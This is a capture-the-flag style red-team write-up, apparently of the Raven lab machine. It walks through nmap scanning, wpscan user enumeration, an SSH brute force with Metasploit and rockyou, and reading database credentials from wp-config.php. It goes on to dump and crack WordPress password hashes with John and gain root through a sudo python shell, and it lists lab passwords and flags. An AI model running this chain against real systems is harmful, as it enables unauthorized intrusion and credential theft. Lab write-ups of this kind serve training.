## Red Team: Summary of Operations

### Table of Contents

* Exposed Services
* Critical Vulnerabilities
* Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

$ nmap -sV 192.168.1.110

This scan identifies the services below as potential points of entry:

![nmap](https://user-images.githubusercontent.com/92223941/167323675-6f768eff-da1b-490b-b86c-72e2a331e513.PNG)


* Target 1
	- Port 22/TCP SSH
	- Port 80/TCP http
	- Port 111/TCP rpcblind
	- Port 139/TCP netbios -ssn
	- Port 445/TCP netbios -ssn

The following vulnerabilities were identified on each target:

* Target 1
	- Wordpress enumeration
	- Improper use of SSH
	- Weak user password
	- Misconfigure use of privilege escalation

### Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

* Target 1
	- flag1.txt: b9bbcb33e11b80be759c4e844862482d
		- Exploit Used
			- Used wpscan to enumerate the user from the      wordpress website
			- wpscan –url http://192.168.1.110/wordpress -enumerate u
			![flag1a](https://user-images.githubusercontent.com/92223941/167323759-8b74a228-fd22-46af-8999-f0280edcce4b.PNG)
			![flag1b](https://user-images.githubusercontent.com/92223941/167323777-53619b86-1123-4d0d-8a23-56ab23b44df5.PNG)


			- Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
			- Msfconsole
			- Use auxiliary/scanner/ssh/ssh_login
			- options
			- set Rhosts 192.168.1.110, 
			- set PASS_File /usr/share/wordlists/rockyou.txt,
			- set USERNAME Michael
			- set VERBOSE true
			- run
			
			![flag1c](https://user-images.githubusercontent.com/92223941/167323904-5f7dbbbf-c62e-4840-9d8d-5c3cb6ca28d3.PNG)
			![flag1d](https://user-images.githubusercontent.com/92223941/167323988-ee4f5658-4624-4ac0-9aa0-6d47643b3918.PNG)
			![flag1e](https://user-images.githubusercontent.com/92223941/167324002-8ede5afa-1078-40b4-a2aa-29477dd533b2.PNG)
			![flag1f](https://user-images.githubusercontent.com/92223941/167324020-5c639462-a395-4025-a2c9-09fd8bd3af5d.PNG)




			- I then login into Michael via SSH 
			- SSH michael@192.168.1.110 password: michael
			![flag1g](https://user-images.githubusercontent.com/92223941/167324082-3fc31b7f-4941-42ed-a7aa-83717c4d95ab.PNG)

			- I then went into the html directory and listed the directories in it
			- cd /var/www/html
			- ls
			
			![flag1h](https://user-images.githubusercontent.com/92223941/167324979-d7ebf9a0-ca4b-41f1-902d-44ea39952d6a.PNG)

			- I then went into the service.html file and found flag1.
			- nano service.html
			-  ctrl+w “flag”
			
			![flag1i](https://user-images.githubusercontent.com/92223941/167325079-19322eb6-7552-42c7-bd5c-23466815a0e4.PNG)


	- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
		- Exploit Used
			- I went back one directory and listed the files and found flag 2
			- cd ..
			- ls
			- cat flag2.txt
			
			![flag2](https://user-images.githubusercontent.com/92223941/167325463-abec4f96-5346-4b02-89d8-152dc391f0bd.PNG)


	- flag3.txt: afc01ab56b50591e7dccf93122770cd2
		- Exploit Used
			- I went back to the html directory and went into the wordpress directory and listed the directories
			- cd html
			- cd wordpress
			
			![flag3a](https://user-images.githubusercontent.com/92223941/167325569-dc746cd4-2576-49c0-8df8-37dc32edf0f4.PNG)

			- I then went into the wp-config file and found the password for sql login
			- Nano wp-config.php
			
			![flag3b](https://user-images.githubusercontent.com/92223941/167325638-870dc113-3eda-4792-bba7-c003cb2396df.PNG)
			![flag3c](https://user-images.githubusercontent.com/92223941/167325672-71cdd3a8-44bf-4fde-b8e3-54b083990ded.PNG)


			- I logged in via sql
			- mysql -u root -P password: R@v3nSecurity
			
			![flag3d](https://user-images.githubusercontent.com/92223941/167325716-23e594d1-5838-443b-81ea-5369e1bf53ba.PNG)

			- I then viewed the databases then viewed the tables
			- show databases;
			- show tables;
			
			![flag3e](https://user-images.githubusercontent.com/92223941/167325769-473c1a9a-947c-4760-aeba-7934237064d0.PNG)
			![flag3f](https://user-images.githubusercontent.com/92223941/167325809-1d6fc6a6-e45e-44ed-ae22-b19346092a2f.PNG)


			- I then selected wp_posts and was able to find flag3
			- select * from wp_posts;
			
			![flag3g](https://user-images.githubusercontent.com/92223941/167325856-51d21d20-cd5b-4c10-9568-3c38b3f7f971.PNG)
			![flag3h](https://user-images.githubusercontent.com/92223941/167325887-ab8c0c7f-e164-4bab-8800-02261a97f9e6.PNG)



	- Flag4.txt: 715dea6c055b9fe3337544932f2941ce
		- Exploit Used
			- While still being logged in via sql I described the table wp_users
			- describe wp_users;
			- I then formatted the username and passwords being separated by a colon sign.
			- select concat_ws(‘:’, user_login, user_pass) from wp_users;
			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
			- select concat_ws(‘:’, user_login, user_pass) from wp_users into outfile ‘var/www/wp_hashes.txt’;
			- cat wp_hashes.txt
			- I copied wp_hashes.txt file and exited Michael’s computer and pasted the file on www directory on my pc
			- “copied username and passwords”
			- Exit
			- cd /var/www
			- ls
			- touch wp_hashes.txt
			- nano wps_hashes.txt
			- “pasted username and passwords”
			- I ran john the ripper to brute force the password with the usernames and found the password for steven
			- John wp_hashes.txt
			- I logged into Steven via ssh 
			- ssh steven password:pink84
			- I ran a python command to login via root
			- sudo python -c ‘import pty:pty.spawn(“/bin/bash”)’
			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
			- cd /root
			- ls
			- cat flag4.txt
